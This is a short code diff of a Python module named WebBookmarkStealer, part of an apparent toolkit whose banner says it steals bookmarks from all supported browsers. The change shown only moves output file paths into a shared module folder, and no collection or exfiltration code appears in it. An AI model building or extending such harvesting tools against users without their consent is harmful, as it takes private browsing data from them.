@@ -8,7 +8,7 @@ from config import ModuleManager
 
 class WebBookmarksRecovery(ModuleManager):
     def __init__(self) -> None:
-        super().__init__(module_name="WebBookmarkStealer")
+        super().__init__(module_name="WebBookmarkStealer", module_path="browsers/bookmarks")
         
         self.banner(r"""
      _______         ______              _                       _          
@@ -21,11 +21,8 @@ class WebBookmarksRecovery(ModuleManager):
   `-=========-`()       Stealing bookmarks from all supported browsers
                 """)
         
-        self.browsers_folder = self.output_folder_user / 'browsers'
-        self.output_filename_csv = self.browsers_folder / 'browser_bookmarks_all.csv'
-        self.output_filename_json = self.browsers_folder / 'browser_bookmarks_all.json'
-        
-        self.browsers_folder.mkdir(parents=True, exist_ok=True)
+        self.output_filename_csv = self.module_output / 'browser_bookmarks_all.csv'
+        self.output_filename_json = self.module_output / 'browser_bookmarks_all.json'
 
     def run(self):
         try:
